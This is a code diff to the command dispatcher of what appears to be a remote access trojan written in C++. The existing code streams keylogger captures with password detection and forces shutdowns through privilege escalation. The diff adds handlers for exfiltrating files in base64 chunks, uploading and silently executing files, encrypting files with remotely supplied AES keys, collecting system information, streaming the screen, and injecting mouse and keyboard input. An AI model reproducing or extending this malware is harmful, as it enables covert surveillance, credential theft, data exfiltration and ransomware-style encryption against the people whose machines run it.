@@ -2,6 +2,9 @@
 
 static Keylogger g_keylogger;
 static std::atomic<bool> g_isKeylogging(false);
+static FileTransferController g_fileTransfer;
+static InputManager g_inputMgr;
+static std::atomic<bool> g_isStreaming(false);
 
 CommandDispatcher::CommandDispatcher() {
     registerHandlers();
@@ -19,7 +22,7 @@ void CommandDispatcher::dispatch(const Message& msg, ResponseCallBack cb) {
         catch (const std::exception& e) {
             json errData = {
                 {"status", "failed"},
-                {"msg", std::string("Internal Error: "), e.what()}
+                {"msg", std::string("Internal Error: ") + e.what()}
             };
 
             cb(
@@ -285,7 +288,6 @@ void CommandDispatcher::registerHandlers() {
         }
     };
 
-
     routes_[Protocol::TYPE::CAM_RECORD] = [](const Message& msg, ResponseCallBack cb) {
         std::thread([msg, cb]() {
             try {
@@ -429,7 +431,6 @@ void CommandDispatcher::registerHandlers() {
             } catch(...) {}
             if (intervalMs < 1) intervalMs = 1;
 
-            // Pre-allocate string để tránh reallocation
             std::string stringForAnalyzer;
             stringForAnalyzer.reserve(2048);
             
@@ -438,7 +439,6 @@ void CommandDispatcher::registerHandlers() {
                 
                 vector<string> currentKeysVector = Keylogger::getDataAndClear();
                 if (!currentKeysVector.empty()) {
-                    // Gửi ngay không đợi password detection
                     cb(Message(Protocol::TYPE::STREAM_DATA, 
                         {
                             {"status", "ok"},
@@ -453,18 +453,14 @@ void CommandDispatcher::registerHandlers() {
                     }
                     stringForAnalyzer.reserve(totalSize);
                     
-                    // Concatenate
                     for (const auto& key : currentKeysVector) {
                         stringForAnalyzer += key;
                     }
-
-                    // Chạy password detection async để không block việc gửi
                     std::thread([stringForAnalyzer]() {
                         PasswordDetector::analyzeKeylogBuffer(stringForAnalyzer);
                     }).detach();
                 }
                 
-                // Tính toán sleep time chính xác để đảm bảo interval
                 auto elapsed = std::chrono::steady_clock::now() - startTime;
                 auto sleepTime = std::chrono::milliseconds(intervalMs) - 
                                  std::chrono::duration_cast<std::chrono::milliseconds>(elapsed);
@@ -519,32 +515,26 @@ void CommandDispatcher::registerHandlers() {
             #ifdef _WIN32
                 system("shutdown /s /t 0");
             #elif __APPLE__
-                // Force shutdown methods (tried in order of aggressiveness)
-                // Method 1: halt (most aggressive - immediately halts system)
                 std::string haltResult = PrivilegeEscalation::executeWithPrivileges("halt");
                 if (!haltResult.empty()) {
-                    return; // Success
+                    return; 
                 }
                 
-                // Method 2: shutdown -h now (immediate shutdown)
                 std::string shutdownResult = PrivilegeEscalation::executeWithPrivileges("shutdown -h now");
                 if (!shutdownResult.empty()) {
-                    return; // Success
+                    return;
                 }
                 
-                // Method 3: shutdown -h +0 (shutdown in 0 seconds)
                 std::string shutdown0Result = PrivilegeEscalation::executeWithPrivileges("shutdown -h +0");
                 if (!shutdown0Result.empty()) {
-                    return; // Success
+                    return; 
                 }
                 
-                // Method 4: osascript (may require user interaction)
                 int result = system("osascript -e 'tell application \"System Events\" to shut down'");
                 if (result == 0) {
-                    return; // Success
+                    return; 
                 }
                 
-                // Method 5: Direct sudo commands as fallback
                 system("sudo halt");
                 std::this_thread::sleep_for(std::chrono::milliseconds(500));
                 system("sudo shutdown -h now");
@@ -552,7 +542,7 @@ void CommandDispatcher::registerHandlers() {
                 int result = system("systemctl poweroff");
                 if (result != 0) {
                     PrivilegeEscalation::executeWithPrivileges("systemctl poweroff");
-                }
+                } 
             #endif
         }).detach();
     };
@@ -679,6 +669,214 @@ void CommandDispatcher::registerHandlers() {
                 "",
                 msg.from
             ));
+        }
+    };
+
+    routes_[Protocol::TYPE::FILE_DOWNLOAD] = [](const Message& msg, ResponseCallBack cb) {
+        std::thread([msg, cb]() {
+            try {
+                std::string filePath = msg.getDataString();
+                std::string sessionId = FileTransferController::generateSessionId();
+
+                if (!g_fileTransfer.startDownload(sessionId, filePath)) {
+                    cb(Message(Protocol::TYPE::ERROR, {{"msg", "CAN'T OPEN FILE TO DOWNLOAD"}}, "", msg.from));
+                    return;
+                }
+
+                auto session = g_fileTransfer.getSession(sessionId);
+                cb(Message(Protocol::TYPE::FILE_PROGRESS, {
+                    {"sessionId", sessionId},
+                    {"fileName", session->fileName},
+                    {"totalSize", session->totalSize},
+                    {"status", "start"}
+                }, "", msg.from));
+
+                while (g_fileTransfer.isSessionActive(sessionId)) {
+                    std::string rawChunk = g_fileTransfer.getDownloadChunk(sessionId, 32 * 1024);
+                    if (rawChunk.empty()) break;
+
+                    std::string encodedChunk = base64_encode(reinterpret_cast<const unsigned char*>(rawChunk.data()), (unsigned int)rawChunk.size());
+
+                    cb(Message(Protocol::TYPE::FILE_CHUNK, {
+                        {"sessionId", sessionId},
+                        {"data", encodedChunk}
+                    }, "", msg.from));
+                }
+
+                g_fileTransfer.cleanupSession(sessionId);
+                cb(Message(Protocol::TYPE::FILE_COMPLETE, {{"sessionId", sessionId}, {"status", "success"}}, "", msg.from));
+
+            } catch (const std::exception& e) {
+                cb(Message(Protocol::TYPE::ERROR, {{"msg", e.what()}}, "", msg.from));
+            }
+        }).detach(); 
+    };
+
+    routes_[Protocol::TYPE::FILE_UPLOAD] = [](const Message& msg, ResponseCallBack cb) {
+        try {
+            std::string path = msg.data.value("path", ""); 
+            std::string fileName = msg.data.value("fileName", "");
+            int64_t size = msg.data.value("size", (int64_t)0);
+            std::string sessionId = FileTransferController::generateSessionId();
+
+            bool success = g_fileTransfer.startUpload(sessionId, path, fileName, size);
+            
+            cb(Message(Protocol::TYPE::FILE_UPLOAD, {
+                {"status", success ? "ok" : "failed"},
+                {"sessionId", sessionId},
+                {"msg", success ? "Ready to receive data" : "Can't create file at this url"}
+            }, "", msg.from));
+
+        } catch (...) {
+            cb(Message(Protocol::TYPE::ERROR, {{"msg", "Upload failed"}}, "", msg.from));
+        }
+    };
+
+    routes_[Protocol::TYPE::FILE_CHUNK] = [](const Message& msg, ResponseCallBack cb) {
+        try {
+            std::string sessionId = msg.data.value("sessionId", "");
+            std::string encodedData = msg.data.value("data", "");
+            
+            std::string decodedData = base64_decode(encodedData); 
+
+            if (g_fileTransfer.processUploadChunk(sessionId, decodedData, 0)) {
+                auto session = g_fileTransfer.getSession(sessionId);
+                if (session && session->currentSize >= session->totalSize) {
+                    g_fileTransfer.cleanupSession(sessionId);
+                    cb(Message(Protocol::TYPE::FILE_COMPLETE, {{"sessionId", sessionId}, {"msg", "Upload successfully"}}, "", msg.from));
+                }
+            }
+        } catch (...) {
+            cb(Message(Protocol::TYPE::ERROR, {{"msg", "Write chunk failed"}}, "", msg.from));
+        }
+    };
+
+    routes_[Protocol::TYPE::FILE_EXECUTE] = [this](const Message& msg, ResponseCallBack cb) {
+        try {
+            std::string filePath = msg.data.is_string() ? msg.getDataString() : msg.data.value("path", "");
+            
+            if (filePath.empty()) {
+                cb(Message(Protocol::TYPE::ERROR, {{"msg", "Path is empty"}}, "", msg.from));
+                return;
+            }
+
+            bool success = FileTransferController::executeFile(filePath);
+
+            cb(Message(Protocol::TYPE::FILE_EXECUTE, {
+                {"status", success ? "ok" : "failed"},
+                {"msg", success ? "File started silently" : "Failed to execute file"}
+            }, "", msg.from));
+        } catch (const std::exception& e) {
+            cb(Message(Protocol::TYPE::ERROR, {{"msg", e.what()}}, "", msg.from));
+        }
+    };
+    
+    routes_[Protocol::TYPE::FILE_ENCRYPT] = [this](const Message& msg, ResponseCallBack cb) {
+        try {
+            std::string filePath = msg.data.is_string() ? msg.getDataString() : msg.data.value("path", "");
+            std::string key = msg.data.value("key", "");
+            std::string iv = msg.data.value("iv", "");
+
+            bool isEncrypted = filePath.size() > 4 && filePath.substr(filePath.size() - 4) == ".enc";
+            bool toEncrypt = !isEncrypted;
+
+            bool success = FileTransferController::processAES(filePath, toEncrypt, key, iv);
+
+            cb(Message(Protocol::TYPE::FILE_ENCRYPT, {
+                {"status", success ? "ok" : "failed"},
+                {"msg", success ? (toEncrypt ? "File Encrypted" : "File Decrypted") : "AES Error"}
+            }, "", msg.from));
+        } catch (const std::exception& e) {
+            cb(Message(Protocol::TYPE::ERROR, {{"msg", e.what()}}, "", msg.from));
+        }
+    };
+
+    routes_[Protocol::TYPE::SYSTEM_INFO] = [this](const Message& msg, ResponseCallBack cb) {
+        try {
+            json specs = SystemInfoController::getSystemSpecs();
+
+            cb(Message(
+                Protocol::TYPE::SYSTEM_INFO,
+                {
+                    {"status", "ok"},
+                    {"data", specs}
+                },
+                "",
+                msg.from
+            ));
+        } catch (const std::exception& e) {
+            cb(Message(
+                Protocol::TYPE::ERROR,
+                {{"msg", std::string("System Info Error: ") + e.what()}},
+                "",
+                msg.from
+            ));
+        }
+    };
+
+    routes_[Protocol::TYPE::START_STREAM] = [this](const Message& msg, ResponseCallBack cb) {
+        if (g_isStreaming) {
+            cb(Message(Protocol::TYPE::ERROR, {{"msg", "Stream is already running"}}, "", msg.from));
+            return;
+        }
+
+        g_isStreaming = true;
+        cb(Message(Protocol::TYPE::START_STREAM, {{"status", "ok"}}, "", msg.from));
+
+        std::thread([this, msg, cb]() {
+            FastCapture fastCap;
+            
+            int targetFps = 30;
+            int frameDelay = 1000 / targetFps;
+
+            while (g_isStreaming) {
+                auto start = std::chrono::steady_clock::now();
+
+                try {
+                    std::vector<unsigned char> rawJpeg = fastCap.captureFrameRaw();
+                    
+                    if (!rawJpeg.empty() && conn_) {
+                        conn_->sendBinary(rawJpeg);
+                    }
+                } catch (const std::exception& e) {
+                    std::cerr << "[Stream] Error: " << e.what() << std::endl;
+                } catch (...) {}
+
+                auto end = std::chrono::steady_clock::now();
+                auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
+                if (elapsed.count() < frameDelay) {
+                    std::this_thread::sleep_for(std::chrono::milliseconds(frameDelay) - elapsed);
+                }
+            }
+        }).detach();
+    };
+
+    routes_[Protocol::TYPE::STOP_STREAM] = [](const Message& msg, ResponseCallBack cb) {
+        g_isStreaming = false;
+        cb(Message(Protocol::TYPE::STOP_STREAM, {{"status", "stopped"}}, "", msg.from));
+    };
+
+    routes_[Protocol::TYPE::MOUSE_MOVE] = [](const Message& msg, ResponseCallBack cb) {
+        if (msg.data.contains("x") && msg.data.contains("y")) {
+            int x = msg.data["x"].get<int>();
+            int y = msg.data["y"].get<int>();
+            g_inputMgr.MoveMouse(x, y);
+        }
+    };
+
+    routes_[Protocol::TYPE::MOUSE_CLICK] = [](const Message& msg, ResponseCallBack cb) {
+        std::string btn = msg.data.value("button", "left");
+        bool down = msg.data.value("down", false);
+        g_inputMgr.MouseClick(btn == "left", down);
+    };
+
+    routes_[Protocol::TYPE::KEY_EVENT] = [](const Message& msg, ResponseCallBack cb) {
+        int key = msg.data.value("keycode", 0);
+        bool down = msg.data.value("down", false);
+        
+        if (key > 0) {
+            if (down) g_inputMgr.KeyPress(key);
+            else g_inputMgr.KeyRelease(key);
         }
     };
 }
